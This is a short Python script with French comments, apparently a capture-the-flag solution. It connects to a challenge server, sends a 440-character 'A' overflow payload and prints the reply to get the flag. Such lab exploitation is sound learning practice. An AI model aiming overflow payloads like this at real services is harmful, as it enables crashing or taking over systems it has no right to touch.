from socket import socket

# Connexion au challenge
sock = socket()
sock.connect(("ctf.esnhack.fr", 3003))

# Affichage du message d'arriver
print(sock.recv(1024).decode())

payload = "A"*440

# Envoie de la payload
sock.send(payload.encode())
sock.send("\n".encode())

# Réception du résultat et parse pour récupérer que le flag
donnee = sock.recv(1024).decode()
print(donnee)